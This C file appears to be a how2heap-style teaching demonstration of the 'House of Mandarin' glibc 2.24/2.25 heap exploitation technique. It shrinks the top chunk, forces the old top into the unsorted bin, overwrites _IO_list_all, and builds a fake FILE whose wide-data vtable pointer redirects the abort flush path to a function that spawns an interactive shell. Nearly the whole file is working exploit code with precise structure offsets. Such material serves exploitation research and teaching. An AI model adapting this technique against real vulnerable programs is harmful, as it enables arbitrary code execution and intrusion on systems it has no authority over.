#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

/*
  House of Mandarin
  =================

  Author: Horia Andrei Frîcu

  This technique targets the small historical window after the old House of
  Orange FILE-vtable overwrite was restricted, but before tcache existed:

      glibc 2.24 / 2.25

  glibc 2.24 introduced validation for FILE vtables. That breaks the classic
  House of Orange payload that points the FILE vtable at attacker-controlled
  heap memory. House of Mandarin keeps the top-chunk / unsorted-bin part of
  House of Orange, but it uses a valid libc vtable, _IO_wfile_jumps, then pivots
  through the wide-data path to reach an attacker-controlled function pointer.

  Original write-up:
      https://horia-f.github.io/posts/house-of-mandarin.html

  Assumptions:
      - heap overflow into the top chunk
      - libc leak
      - heap leak

  This how2heap-style demo writes the corrupted metadata directly so the file
  stays focused on the allocator and FILE internals rather than on a toy menu
  program.
*/

#define IO_LIST_ALL_OFFSET_FROM_UNSORTED 0x9a8

#define FAKE_FILE_SIZE 0x200
#define OFF_SIZE 0x08
#define OFF_FD 0x10
#define OFF_BK 0x18
#define OFF_WRITE_BASE 0x20
#define OFF_WRITE_PTR 0x28
#define OFF_WIDE_DATA_BUF_BASE 0x50
#define OFF_CHAIN 0x68
#define OFF_LOCK 0x88
#define OFF_WIDE_DATA 0xa0
#define OFF_VTABLE 0xd8
#define OFF_WIDE_VTABLE 0x150
#define OFF_WIDE_DOALLOCATE 0x168

static void write_ptr(unsigned char *base, size_t offset, uintptr_t value)
{
    *(uintptr_t *)(base + offset) = value;
}

static void write_int(unsigned char *base, size_t offset, int value)
{
    *(int *)(base + offset) = value;
}

static void fill_bytes(unsigned char *base, unsigned char value, size_t length)
{
    size_t i;

    for (i = 0; i < length; i++) {
        base[i] = value;
    }
}

static void write_command(unsigned char *base)
{
    base[0] = ' ';
    base[1] = ' ';
    base[2] = 's';
    base[3] = 'h';
    base[4] = ' ';
    base[5] = '-';
    base[6] = 'i';
    base[7] = '\0';
}

static void winner(void *fp)
{
    char *argv[] = {"sh", "-c", "id; exec sh -i", NULL};

    (void)fp;
    fprintf(stderr, "\n[+] control reached winner() through the fake wide FILE\n");
    execve("/bin/sh", argv, NULL);
    _exit(127);
}

int main(void)
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    if (sizeof(size_t) != 8) {
        fprintf(stderr, "This demonstration is for 64-bit glibc only.\n");
        return 1;
    }

    fprintf(stderr, "Welcome to the House of Mandarin\n");
    fprintf(stderr, "Target: glibc 2.24 / 2.25, after FILE vtable validation and before tcache.\n\n");

    /*
      Use dlsym for libc data symbols. A direct external reference to
      _IO_wfile_jumps can create a copy relocation in the PIE executable, and
      FILE vtable validation requires the vtable pointer to live in libc's
      __libc_IO_vtables section.
    */
    void *libc = dlopen("libc.so.6", RTLD_NOW);
    if (!libc) {
        fprintf(stderr, "dlopen failed: %s\n", dlerror());
        return 1;
    }

    uintptr_t io_wfile_jumps = (uintptr_t)dlsym(libc, "_IO_wfile_jumps");

    if (!io_wfile_jumps) {
        fprintf(stderr, "dlsym failed: %s\n", dlerror());
        return 1;
    }

    /*
      Step 1: Create a normal heap chunk immediately before the top chunk.

      A real target would need an overflow from this chunk into the top chunk.
      We keep a pointer to the top chunk and write to it directly below to model
      that primitive.
    */
    fprintf(stderr, "Step 1: allocate a chunk before the top chunk.\n");
    char *p1 = malloc(0x400 - 0x10);
    if (!p1) {
        return 1;
    }

    uintptr_t *top = (uintptr_t *)(p1 + 0x400 - 0x10);
    fprintf(stderr, "p1:        %p\n", p1);
    fprintf(stderr, "old top:   %p\n\n", (void *)top);

    /*
      Step 2: Shrink the top chunk.

      The corrupted top size must satisfy malloc's top chunk checks:

          1. top + size is page aligned
          2. PREV_INUSE is set

      For the usual first heap page layout this becomes 0xc01, but computing it
      from the top address makes the demonstration less brittle.
    */
    fprintf(stderr, "Step 2: shrink top.size with the simulated overflow.\n");
    uintptr_t top_size = (0x1000 - ((uintptr_t)top & 0xfff)) | 1;
    top[1] = top_size;
    fprintf(stderr, "corrupted top.size: %#lx\n\n", (unsigned long)top[1]);

    /*
      Step 3: Force sysmalloc.

      The request is larger than the corrupted top chunk and smaller than the
      mmap threshold, so malloc extends the heap. The old top chunk is put into
      the unsorted bin, giving us an unsorted-bin chunk that overlaps memory we
      can still corrupt through the original overflow.
    */
    fprintf(stderr, "Step 3: trigger sysmalloc so the old top enters the unsorted bin.\n");
    char *p2 = malloc(0x1000);
    if (!p2) {
        return 1;
    }
    fprintf(stderr, "new allocation: %p\n", p2);
    fprintf(stderr, "old top fd leak: %p\n", (void *)top[2]);
    fprintf(stderr, "old top bk leak: %p\n\n", (void *)top[3]);

    /*
      In glibc 2.24 on x86_64, the unsorted-bin fd leak is a main_arena
      pointer. The original exploit computes _IO_list_all from a libc leak; this
      demo derives it from the same fixed offset used by the write-up.
    */
    uintptr_t unsorted_fd = top[2];
    uintptr_t io_list_all = unsorted_fd + IO_LIST_ALL_OFFSET_FROM_UNSORTED;

    fprintf(stderr, "Step 4: prepare the unsorted-bin attack against _IO_list_all.\n");
    fprintf(stderr, "computed _IO_list_all: %p\n", (void *)io_list_all);
    fprintf(stderr, "_IO_wfile_jumps:      %p\n\n", (void *)io_wfile_jumps);

    /*
      Step 5: Build the fake FILE on top of the old top chunk.

      The first words are also malloc chunk metadata:

          fake+0x08: chunk size 0x61
          fake+0x10: fd, restored to the unsorted-bin head
          fake+0x18: bk, set to _IO_list_all - 0x10

      When malloc processes this unsorted chunk, it performs:

          bck->fd = unsorted_chunks(av)

      With bck == _IO_list_all - 0x10, this overwrites _IO_list_all with the
      unsorted-bin head. As in House of Orange, abort later walks that structure
      as a FILE list and reaches our fake FILE through the bin links.
    */
    unsigned char *fake = (unsigned char *)top;
    uintptr_t fake_file = (uintptr_t)fake;
    uintptr_t fake_lock = fake_file + 0x180;

    fill_bytes(fake, 0, FAKE_FILE_SIZE);

    /*
      The original exploit can place "  sh" here and point the wide-data call
      at system. This standalone demo points the controlled call at winner()
      so the process cleanly execve's a shell instead of returning to abort.
      These bytes still work as harmless chunk prev_size / FILE flags data.
    */
    write_command(fake);

    write_ptr(fake, OFF_SIZE, 0x61);
    write_ptr(fake, OFF_FD, unsorted_fd);
    write_ptr(fake, OFF_BK, io_list_all - 0x10);

    /*
      Satisfy the _IO_flush_all_lockp write condition:

          fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base

      _mode is already zero because the fake FILE was memset to zero.
    */
    write_ptr(fake, OFF_WRITE_BASE, 0);
    write_ptr(fake, OFF_WRITE_PTR, 1);

    /*
      Set up the wide-data path used by _IO_wfile_overflow. The FILE vtable is
      the legitimate _IO_wfile_jumps table, so it passes glibc 2.24 vtable
      validation. The controlled edge is reached later through wide_data.
    */
    write_ptr(fake, 0x48, 0);
    write_ptr(fake, OFF_WIDE_DATA_BUF_BASE, 0);
    write_ptr(fake, OFF_CHAIN, 0);
    write_ptr(fake, OFF_LOCK, fake_lock);
    write_ptr(fake, OFF_WIDE_DATA, fake_file + 0x20);
    write_ptr(fake, OFF_VTABLE, io_wfile_jumps);
    write_ptr(fake, OFF_WIDE_VTABLE, fake_file + 0x100);
    write_ptr(fake, OFF_WIDE_DOALLOCATE, (uintptr_t)winner);

    fprintf(stderr, "fake FILE:           %p\n", (void *)fake_file);
    fprintf(stderr, "fake _lock:          %p\n", (void *)fake_lock);
    fprintf(stderr, "fake wide vtable:    %p\n", (void *)(fake_file + 0x100));
    fprintf(stderr, "wide doallocate ptr: %p\n\n", (void *)winner);

    /*
      The unsorted-bin attack writes the unsorted-bin head to _IO_list_all.
      During the abort flush, glibc first interprets that arena address as a
      FILE and should then follow its _chain field to our heap fake. Depending
      on incidental arena contents, the arena pseudo-FILE may satisfy the flush
      predicate itself and fail vtable validation before the chain is followed.

      A real exploit can arrange the surrounding bin state to keep this first
      pseudo-FILE passive. For a deterministic standalone demonstration, we
      normalize just those predicate fields directly.
    */
    write_ptr((unsigned char *)unsorted_fd, OFF_WRITE_BASE, 1);
    write_ptr((unsigned char *)unsorted_fd, OFF_WRITE_PTR, 0);
    write_int((unsigned char *)unsorted_fd, 0xc0, 0);

    /*
      Step 6: Trigger malloc's consistency failure.

      The unsorted-bin attack happens before malloc reports the corrupted state.
      The error path calls abort, which flushes all FILE objects:

          malloc_printerr
          __libc_message
          abort
          fflush
          _IO_flush_all_lockp
          _IO_wfile_overflow
          _IO_wdoallocbuf
          winner(fake_FILE)
    */
    fprintf(stderr, "Step 6: trigger malloc_printerr and the FILE flush path.\n");
    char *trigger = malloc(0x10);
    (void)trigger;

    return 0;
}
